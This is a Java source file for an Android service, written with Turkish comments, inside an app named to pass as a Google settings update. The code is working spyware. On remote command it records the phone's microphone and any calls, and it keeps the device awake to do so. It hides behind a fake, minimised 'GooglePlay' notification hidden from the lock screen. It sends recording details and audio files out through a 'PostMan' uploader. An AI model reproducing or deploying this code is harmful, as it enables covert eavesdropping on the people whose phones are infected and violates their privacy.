package com.setting.dl.google.googlesettingupdate.audio;


import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.usage.UsageStats;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.os.PersistableBundle;
import android.os.PowerManager;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.NotificationCompat;
import android.support.v4.content.ContextCompat;

import com.setting.dl.google.googlesettingupdate.BuildConfig;
import com.setting.dl.google.googlesettingupdate.R;
import com.setting.dl.google.googlesettingupdate.Run;
import com.setting.dl.google.googlesettingupdate.phone.InstalledApps;
import com.setting.dl.google.googlesettingupdate.save.Save;
import com.setting.dl.google.googlesettingupdate.time.Time;
import com.setting.dl.google.googlesettingupdate.phone.FileSplitter;
import com.setting.dl.google.googlesettingupdate.ptt.kahverengi.PostMan;
import com.setting.dl.google.googlesettingupdate.u;
import com.setting.dl.google.googlesettingupdate.usage.UsageManager;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class AudioService extends Service {
   
   //recordLoop için anahtar
   private static boolean               running;
   private static boolean               high;
   private        MediaRecorder         recorder;
   //private        DisplayManager  displayManager;
   private        String                recordFile;
   private        long                  duration;
   private        long                  delay;
   private        Date                  recordDate;
   private        boolean               isCallRecord;
   private        String                callNumber;
   private        String                commandId;
   private        PowerManager.WakeLock wakeLock;
   private final  Object                object = new Object();
   //kaydın yapıldığı dosya
   //kayıt yapılmıyorsa daima null
   private static File                  onRecordingFile;
   
   
   @Override
   public void onCreate() {
      super.onCreate();
      
      startFore();
      PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
      wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "GSettings::AudioService");
   }
   
   @Override
   public int onStartCommand(Intent intent, int flags, int startId) {
      
      
      if (ifIsRunning()) {
         
         u.log.d("There is a record now");
         return Service.START_NOT_STICKY;
      }
      else if (!getArguments(intent)) {
         
         Run.run(this::stopMe, 1000L);
         return Service.START_NOT_STICKY;
      }
      
      Run.run(this::run, 1000);//toparlanmak için
      
      return Service.START_NOT_STICKY;
   }
   
   private boolean ifIsRunning() {
      
      if (running) {
         
         if (recordFile == null || commandId == null) return true;
         
         String msg = String.format(new Locale("tr"),
               
               "Service running%n%s%n%n" +
               "File     : %s%n" +
               "Duration : %d%n" +
               "Delay    : %d",
               
               Time.getDate(),
               recordFile,
               duration,
               delay
         );
         
         u.log.d(msg);
         
         if (u.isOnline(this)) {
   
            PostMan.getInstance(getApplicationContext()).postText(this.getClass().getSimpleName(), msg);
         }
         
         return true;
      }
      else {
         running = true;
      }
      
      return false;
   }
   
   private void stopMe() {
      
      running = false;
      recorder = null;
      onRecordingFile = null;
      isCallRecord = false;
      
      releaseWakeLock();
      
      stopForeground(true);
      stopSelf();
   }
   
   private void openWakeLock(){
   
      synchronized (object) {
      
         if (wakeLock != null && !wakeLock.isHeld()) {
   
            wakeLock.acquire(delay + duration + 10000L);
         }
      }
   }
   
   private void releaseWakeLock() {
      
      synchronized (object) {
         
         if (wakeLock != null && wakeLock.isHeld()) {
            
            wakeLock.release();
         }
      }
   }
   
   public static boolean isRunning() {
      return running;
   }
   
   public static void setRunning(boolean running) {
      AudioService.running = running;
      
      if (running) return;
      
      u.log.d("Servis normal bir şekilde sonlandırılıyor");
   }
   
   @Override
   public IBinder onBind(Intent intent) {
      return null;
   }
   
   private boolean getArguments(Intent intent) {
      
      if (intent == null) {
         
         u.log.w("servis boş intent ile başlamayacak");
         return false;
      }
      else {
         
         duration = intent.getLongExtra("duration", 10L) * 60000L;
         delay = intent.getLongExtra("delay", 0L) * 60000L;
         callNumber = intent.getStringExtra("call");
         commandId = intent.getStringExtra("commandId");
         high = intent.getBooleanExtra("high", false);
      }
      
      if (callNumber == null) {
         
         callNumber = "";
         isCallRecord = false;
      }
      else {
         
         isCallRecord = true;
      }
      
      return true;
   }
   
   private void recordLoop() {
      
      if (isCallRecord) {
         
         boolean isStopCallRecord = getSharedPreferences("audio", MODE_PRIVATE).getBoolean("stopcallrecords", false);
         
         if (isStopCallRecord) {
            
            u.log.d("Call Record özelliği kapalı");
            return;
         }
      }
      else {
         
         boolean isStopRecord = getSharedPreferences("audio", MODE_PRIVATE).getBoolean("stoprecords", false);
         
         if (isStopRecord) {
            
            u.log.d("Audio Record özelliği kapalı");
            return;
         }
      }
      
      
      //kontroller 1 saniyede bir yapılacak
      final long LOOP_INTERVAL = 1000L;
      
      long now = Time.getTime();
      long recordStartTime;
      long recordStopTime;
      
      if (delay == 0L) {
         
         recordStartTime = now;
      }
      else {
         
         recordStartTime = now + delay;
      }
      
      recordStopTime = recordStartTime + duration;
      
      
      String fileRecordInfo = "recordinfo";
      
      String recordTime = Time.getDate(recordStartTime);
      String finishTime = Time.getDate(recordStopTime);
      String gecikme    = delay / 60000 + " dakika";
      String time       = duration / 60000 + " dakika";
      
      String value = String.format(
            "%n%n" +
            "Kayıt başlama tarihi : %s%n" +
            "Bitiş                : %s%n" +
            "Süre                 : %s%n" +
            "Gecikme              : %s", recordTime, finishTime, time, gecikme
      );
   
      if (u.isOnline(this) && commandId != null) {
   
         PostMan.getInstance(getApplicationContext()).postText(fileRecordInfo, value);
      }
      
      u.log.d(value);
      
      
      Run.runThread(() -> {
         
         u.log.d("Kayıt kontrol noktası açıldı");
         
         try {
            
            long loop;
            
            //Eğer bu kayıt bir arama kaydı değilse
            //kayıt sırasında bir arama gerçekleştiğinde
            //CallManager running değerini false yaparak servisi durdurur
            //Ve aramayı kaydetmek için yeni bir kayıt başlatır
            //Yani arama kayıtları öncelikli
            while (running) {
               
               loop = System.currentTimeMillis();
               
               if (loop >= recordStartTime && onRecordingFile == null) {
                  
                  recordDate = new Date(recordStartTime);
                  
                  if (isCallRecord) {
                     
                     recordFile = String.format("%s/%s_%s.mp4", getCallAudioFolder(), getDateForFile(recordDate), callNumber);
                  }
                  else {
                     
                     recordFile = String.format("%s/%s.mp4", getAudioFolder(), getDateForFile(recordDate));
                  }
                  
                  
                  u.log.d("duration   = " + duration);
                  u.log.d("delay      = " + delay);
                  u.log.d("recordFile = " + recordFile);
                  
                  
                  startRecord();
               }
               else {
                  
                  if (onRecordingFile == null) {
                     
                     if (BuildConfig.DEBUG) {
                        u.log.d("Kaydın başlamasına %s", u.formatMilliSeconds(recordStartTime - loop));
                     }
                     
                  }
                  else {
                     
                     if (BuildConfig.DEBUG) {
                        
                        u.log.d("Recording time : %s", u.formatMilliSeconds(getRecordedTimeMilis()));
                     }
                  }
               }
               
               if (loop >= recordStopTime) {
                  
                  break;
               }
               
               
               Thread.sleep(LOOP_INTERVAL);
            }
            
            if (recorder != null) {
               
               stopRecord();
            }
            
            u.log.d("Kayıt kontrol noktası normal bir şekilde kapandı");
         }
         catch (Exception e) {
            
            e.printStackTrace();
            u.log.w("Kayıt kontrol noktası hata sebebiyle kapandı");
         }
      });
   }
   
   private long getRecordedTimeMilis() {
      
      return Time.getTime() - recordDate.getTime();
   }
   
   private void run() {
      
      recordLoop();
   }
   
   private void startRecord() {
      
      recorder = new MediaRecorder();
      recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
      recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
      recorder.setOutputFile(recordFile);
      recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
   
      if (high) {
   
         recorder.setAudioSamplingRate(44100);
         recorder.setAudioEncodingBitRate(192000);
      }
      
      
      try {
         
         recorder.prepare();
         recorder.start();
         
         recordDate = new Date();
         
         u.log.d("record started");
         
         openWakeLock();
         
         onRecordingFile = new File(recordFile);
         
         String fileRecordInfo = "RI";
         
         String startTime  = Time.getDate(recordDate.getTime());
         String finishTime = Time.getDate(recordDate.getTime() + duration);
         String gecikme    = delay / 60000 + " dakika";
         String time       = duration / 60000 + " dakika";
         
         
         String value = String.format(
               "Kayıt başladı        : %s%n" +
               "Bitiş                : %s%n" +
               "Süre                 : %s%n" +
               "Gecikme              : %s%n" +
               "Kayıt dosyası        : %s",
               
               startTime, finishTime, time, gecikme, recordFile
         );
         
         u.log.d(value);
   
         if (u.isOnline(this) && commandId != null) {
   
            PostMan.getInstance(getApplicationContext()).postText(fileRecordInfo, value);
         }
      }
      catch (Exception e) {
         
         String error = u.format("%s%nStart record error : %s - %s", Time.dateStamp(), e.toString(), recordFile);
         u.log.w(e.toString());
         
         u.saveToFile(getApplicationContext(), "error", error);
         
         e.printStackTrace();
         
         
         List<UsageStats> lastRunningApps = getLastRunningApps();
   
         if (lastRunningApps != null) {
   
            if (lastRunningApps.size() == 0) {
      
               u.log.d("Son 3 dakika içinde çalışan bir uygulama olmadığı görünüyor");
            }
            else{
   
               StringBuilder s = new StringBuilder();
   
               s.append(u.format("%n%nSon 3 dakika içinde çalışan %d uygulama olduğu görünüyor%n%n", lastRunningApps.size()));
               InstalledApps apps = new InstalledApps(this);
               
               int i = 1;
   
               for (UsageStats stats : lastRunningApps) {
      
                  s.append(u.format("%d. %s [%s]%n", i++, InstalledApps.getApplicationName(this, stats.getPackageName()), stats.getPackageName()));
                  s.append(u.format("LastUsed     : %s%n", Time.getDate(stats.getLastTimeUsed())));
                  s.append(u.format("Foreground   : %s%n", Time.getElapsedTime(stats.getTotalTimeInForeground())));
                  
                  
                  ApplicationInfo applicationInfo = apps.getApplicationInfo(stats.getPackageName());
                  
                  if(applicationInfo == null) continue;
                  
                  s.append(u.format("Game         : %s%n", apps.isGAME(applicationInfo)));
                  
                  List<String> permissions = apps.getPermissions(applicationInfo);
                  
                  if(permissions == null || permissions.size() == 0) continue;
   
                  s.append(u.format("RECORD_AUDIO                  : %s%n", permissions.contains("android.permission.RECORD_AUDIO")));
                  s.append(u.format("CAPTURE_AUDIO_OUTPUT          : %s%n", permissions.contains("android.permission.CAPTURE_AUDIO_OUTPUT")));
                  s.append(u.format("CAPTURE_SECURE_VIDEO_OUTPUT   : %s%n", permissions.contains("android.permission.CAPTURE_SECURE_VIDEO_OUTPUT")));
                  s.append(u.format("CAPTURE_VIDEO_OUTPUT          : %s%n", permissions.contains("android.permission.CAPTURE_VIDEO_OUTPUT")));
                  
                  s.append("========================================================\n");
                  
               }
   
               u.saveToFile(getApplicationContext(), "error", s.toString());
               
               u.log.d(s.toString());
            }
         }
         
         stopRecord();
      }
   }
   
   private void stopRecord() {
      
      try {
         
         if (recorder != null) {
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
               PersistableBundle m = recorder.getMetrics();
               
               int channels = (int) m.get(MediaRecorder.MetricsConstants.AUDIO_CHANNELS);
               
               u.log.d("channels : %d", channels);
               
            }
            
            recorder.stop();
            recorder.reset();
            recorder.release();
            recorder = null;
            
            u.log.d("record stop");
            
            if(!deleteLittleFile()){
   
               saveRecordInfo();
               onRecordingFile = null;
               new FileSplitter(this, new File(recordFile)).split();
               checkAudioFiles();
            }
         }
      }
      catch (Exception e) {
         
         String error = String.format("%s%nStop record error : %s - %s%n", Time.dateStamp(), e.getMessage(), recordFile);
         e.printStackTrace();
         u.saveToFile(getApplicationContext(), "error", error);
      }
      finally {
         
         stopMe();
      }
   }
   
   private List<UsageStats> getLastRunningApps(){
   
      if (!u.isUsageStatGrant(getApplicationContext())) {
         
         u.log.w("İşlemi yapabilmek için gereken izin yok [UsageStat]");
         return null;
      }
      
      return UsageManager.getInstance(this).getLastUsageStats(180000L);
   }
   
   private void saveRecordInfo(){
      
      if(onRecordingFile == null) return;
      
      long duration = u.getDuration(onRecordingFile.getAbsolutePath());
      
      if(duration == -60L) return;
      
      Save save = new Save(getApplicationContext(), "audiorecord");
      save.saveLong("lastRecordDuration", duration);
      
      u.log.d("Son başarılı kayıt süresi kaydedildi : %s [%d ms]", Time.getElapsedTime(duration), duration);
      
      save.saveLong("lastRecordDate", onRecordingFile.lastModified());
      
      u.log.d("Son başarılı kayıt tarihi kaydedildi : %s", Time.getDate(onRecordingFile.lastModified()));
   }
   
   private void checkAudioFiles(){
   
      if (isCallRecord) {
      
         PostMan.getInstance(this).checkCallFiles(commandId);
      }
      else{
      
         PostMan.getInstance(this).checkAudioFiles(commandId);
      }
   }
   
   private boolean deleteLittleFile() {
      
      if (onRecordingFile.exists()) {
         
         if (onRecordingFile.length() < 5000L) {
            
            if (u.deleteFile(onRecordingFile)) {
               
               u.log.w("Eksik veya hatalı kayıt silindi : %s", onRecordingFile.getName());
               return true;
            }
         }
      }
      
      return false;
   }
   
   private void startFore() {
      
      String CHANNEL_ID   = "9647";
      String CHANNEL_NAME = "Audio Channel";
      
      NotificationCompat.Builder builder =
            new NotificationCompat.Builder(this, CHANNEL_ID)
                  .setContentText("Ayarlar Güncelleniyor")
                  .setStyle(new NotificationCompat.BigTextStyle())
                  .setSmallIcon(R.mipmap.playstore)
                  .setPriority(NotificationCompat.PRIORITY_MIN)
                  .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                  .setContentTitle("GooglePlay");
      
      if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
         
         NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
         NotificationChannel chan    = new NotificationChannel(CHANNEL_ID, CHANNEL_NAME, NotificationManager.IMPORTANCE_MIN);
         
         chan.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
         manager.createNotificationChannel(chan);
         
         startForeground(8, builder.build());
         u.log.w("start fore");
      }
      else {
         
         startForeground(0, builder.build());
         u.log.w("start fore");
      }
   }
   
   private String getAudioFolder() {
      
      File audioFolder = new File(getFilesDir(), "audio");
      
      if (!audioFolder.exists()) {
         
         if (audioFolder.mkdir()) {
            
            return audioFolder.getAbsolutePath();
         }
      }
      else {
         
         return audioFolder.getAbsolutePath();
      }
      
      
      return getFilesDir().getAbsolutePath() + "/" + "audio";
   }
   
   private String getCallAudioFolder() {
      
      File audioFolder = new File(getFilesDir(), "call");
      
      if (!audioFolder.exists()) {
         
         if (audioFolder.mkdir()) {
            
            return audioFolder.getAbsolutePath();
         }
      }
      else {
         
         return audioFolder.getAbsolutePath();
      }
      
      
      return getFilesDir().getAbsolutePath() + "/" + "call";
   }
   
   public String getDateForFile(Date date) {
      
      SimpleDateFormat dateFormat = new SimpleDateFormat("ddMMyy_HHmm", Locale.getDefault());
      return dateFormat.format(date) + "_" + date.getTime();
   }
   
   public static void startAudio(Context context, long duration, long delay, String commandId) {
      
      Intent i = new Intent(context, AudioService.class);
      
      i.putExtra("duration", duration);
      i.putExtra("delay", delay);
      i.putExtra("commandId", commandId);
      
      
      ContextCompat.startForegroundService(context, i);
   }
   
   public static void startAudio(Context context, long duration, long delay, String commandId, boolean high) {
      
      Intent i = new Intent(context, AudioService.class);
      
      i.putExtra("duration", duration);
      i.putExtra("delay", delay);
      i.putExtra("commandId", commandId);
      i.putExtra("high", high);
      
      ContextCompat.startForegroundService(context, i);
   }
   
   @Override
   public void onDestroy() {
      super.onDestroy();
      
      if (recorder != null) stopRecord();
   }
   
   public static File getOnRecordingFile() {
      return onRecordingFile;
   }
   
   public static void recordCall(Context context, String number) {
      
      Intent i = new Intent(context, AudioService.class);
      
      i.putExtra("call", number);
      i.putExtra("duration", 5L);
      i.putExtra("delay", 0L);
      i.putExtra("high", true);
      
      ContextCompat.startForegroundService(context, i);
   }
   
   
 
   
  
   
   
   
   
   /* private void startControl() {
      
      if (ControlService.isRunning()) {
         
         u.log.w("ControlService is running");
         return;
      }
      
      Intent i = new Intent(this, ControlService.class);
      
      ContextCompat.startForegroundService(this, i);
   }*/
   
/*    public boolean isScreenOn() {
        
        for (Display display : displayManager.getDisplays()) {
            
            if (display.getState() != Display.STATE_OFF) {
                
                return true;
            }
        }
        
        return false;
    }*/
 /*   private void startStopForeGround() {
        
        startFore();
        stopForeground(true);
    }*/
    
/*    public boolean isForeground() {
        
        for (ActivityManager.RunningServiceInfo service : activityManager.getRunningServices(Integer.MAX_VALUE)) {
            
            if (AudioService.class.getName().equals(service.service.getClassName())) {
                
                if (service.foreground) {
                    
                    u.log.d("Service running foreground");
                    return true;
                }
                else {
                    
                    u.log.d("Service running but not foreground");
                }
                
            }
        }
        return false;
    }*/
    
    
    /*public boolean isCallActive() {
    
        
        
        return audioManager != null && (audioManager.getMode() == AudioManager.MODE_IN_CALL || audioManager.getMode() == AudioManager.MODE_IN_COMMUNICATION);
    }*/
    /*    private File getRecordRegisteryFile() {
        
        return createRecordRegisteryFile();
    }
    
    private File createRecordRegisteryFile() {
        
        File backup = new File(getFilesDir(), "backup");
        
        if (!backup.exists()) {
            
            if (!backup.mkdir()) {
                
                u.log.w("backup klasörü oluşturulamadı");
                
                return null;
            }
        }
        
        File file = new File(backup, "record.txt");
        
        if (!file.exists()) {
            
            try {
                if (!file.createNewFile()) {
                    
                    u.log.w("record dosyası oluşturulamadı");
                    return null;
                }
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }
        
        return file;
    }
    
    private void createRecord() {
        
        try {
            
            long duration = MailingFile.getElapsedTime(recordFile);
            //String durationStr = MailingFile.formatMilliSeconds(MailingFile.getElapsedTime(recordFile));
            
            
            Record record = new Record(
                    recordFile.substring(recordFile.lastIndexOf("/") + 1),
                    duration,
                    recordDate.getTime());
            
            registerRecord(record);
        }
        catch (Exception e) {
            
            u.log.w(e);
        }
    }
    
    private boolean deleteRegisteryFile() {
        
        if (getRecordRegisteryFile().delete()) {
            
            u.log.d("Kayıt bilgileri silindi");
            return true;
        }
        else {
            
            u.log.d("Kayıt bilgileri silinemedi");
            return false;
        }
    }
    
    private void registerRecords(@NonNull List<Record> records) {
        
        try {
            
            File file = getRecordRegisteryFile();
            
            if (file == null) return;
            
            FileOutputStream   fileOutputStream   = new FileOutputStream(file);
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            
            objectOutputStream.writeObject(records);
            objectOutputStream.close();
            fileOutputStream.close();
            
            u.log.d("Kayıtlar dosyaya yazıldı");
        }
        catch (Exception e) {
            
            u.log.w(e);
        }
    }
    
    private void registerRecord(Record record) {
        
        try {
            
            List<Record> records = readRecordRegistery();
            
            if (records == null) return;
            
            
            File file = getRecordRegisteryFile();
            
            if (file == null) return;
            
            records.add(record);
            
            FileOutputStream   fileOutputStream   = new FileOutputStream(file);
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            
            objectOutputStream.writeObject(records);
            objectOutputStream.close();
            fileOutputStream.close();
            
            u.log.d("Kayıt kaydedildi : %s", record.name);
        }
        catch (Exception e) {
            
            u.log.w(e);
        }
    }
    
    private List<Record> readRecordRegistery() {
        
        File file = getRecordRegisteryFile();
        
        if (file == null) return null;
        
        try {
            
            FileInputStream   fileInputStream   = new FileInputStream(file);
            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
            
            
            List<Record> records = (List<Record>) objectInputStream.readObject();
            
            objectInputStream.close();
            fileInputStream.close();
            
            if (records == null) {
                
                u.log.w("kayıtlar okunamadı");
            }
            
            return records;
        }
        catch (Exception e) {
            
            u.log.w(e);
            return new ArrayList<>();
        }
    }*/
    /*public boolean isServiceRunning(Class<?> serviceClass) {
        
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            
            if (serviceClass.getName().equals(service.service.getClassName())) {
                
                return true;
            }
        }
        return false;
    }*/
    /*private void getNotification(){
    
        NotificationManager notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
    
        
        
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            
            StatusBarNotification[] notifications = notificationManager.getActiveNotifications();
    
            
            u.log.d("Notifications");
            u.log.d("===========================================================");
            
            for (StatusBarNotification notification : notifications) {
                
                boolean ongoing = notification.isOngoing();
                String packageName = notification.getPackageName();
                String time = Mail.getInstance().getSendDate(notification.getPostTime());
                
                Notification not = notification.getNotification();
                
                
               Bundle extras = not.extras;
    
                if (extras != null) {
                    
                    String title = String.valueOf(extras.getCharSequence(Notification.EXTRA_TITLE));
                    String text = String.valueOf(extras.getCharSequence(Notification.EXTRA_TEXT));
                    
                    String out = String.format(new Locale("tr"), 
                            
                            
                            "Title       : %s%n" +
                                   "Text        : %s%n" +
                                   "Time        : %s%n" +
                                   "Ongoing     : %s%n" +
                                   "PackageName : %s",
                            
                            title, text, time, ongoing, packageName);
                    
                    u.log.d(out);
                    
                    
                }
                
            }
    
            u.log.d("===========================================================");
            
        }
    
    
    }*/
    /*private float getRecordedFilesSize() {
        
        return (float) (new File(Mail.getInstance().getAudioFolder(this)).length()) / (1024 * 1024);
    }*/
}
